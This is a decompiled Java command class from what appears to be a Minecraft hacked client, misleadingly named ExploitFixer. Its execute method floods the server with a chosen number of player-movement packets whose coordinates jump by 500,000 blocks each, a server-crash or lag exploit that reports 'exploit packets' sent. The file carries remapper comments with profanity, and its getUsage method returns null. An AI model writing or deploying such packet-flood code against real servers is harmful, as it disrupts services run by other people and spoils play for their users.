package com.moonclient.pro.Command.impl;

import com.moonclient.pro.Command.Command;
import java.io.IOException;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.network.chat.Component;
import net.minecraft.network.protocol.game.ServerboundMovePlayerPacket;
import net.minecraft.client.Minecraft;

@Environment(value=EnvType.CLIENT)
public class ExploitFixer
implements Command {
    @Override
    public void execute(String[] args) throws IOException {
        if (args.length != 2) {
            Minecraft.getInstance().player.sendSystemMessage(Component.literal("§b[§9moon§b] §cUsage: " + this.getUsage()), false);
        } else {
            try {
                int packets = Integer.parseInt(args[1]);
                Minecraft mc = Minecraft.getInstance();
                new Thread(() -> {
                        for (int index = 0; index < packets; ++index) {
                            
                            // FUCK-SKIDDERS.CLUB - Remapper Problem
                            // Can't be remapped -> [method_23317, method_23318, method_23321]
                            // Lines -> [24, 25, 26]

                            double newX = mc.player.getX() + (double)(500000 * index);
                            double newY = mc.player.getY() + (double)(500000 * index);
                            double newZ = mc.player.getZ() + (double)(500000 * index);
                            ServerboundMovePlayerPacket.Pos packet = new ServerboundMovePlayerPacket.Pos(newX, newY, newZ, mc.player.onGround());
                            Minecraft.getInstance().getConnection().send(packet);
                        }
                    Minecraft.getInstance().player.sendSystemMessage(Component.literal("§b[§9moon§b] §7Sent " + packets + " exploit packets."), false);
                }).start();
            }
            catch (NumberFormatException var12) {
                Minecraft.getInstance().player.sendSystemMessage(Component.literal("§b[§9moon§b] §7Invalid number format"), false);
            }
        }
    }

    @Override
    public String getUsage() {
        return null;
    }
}
 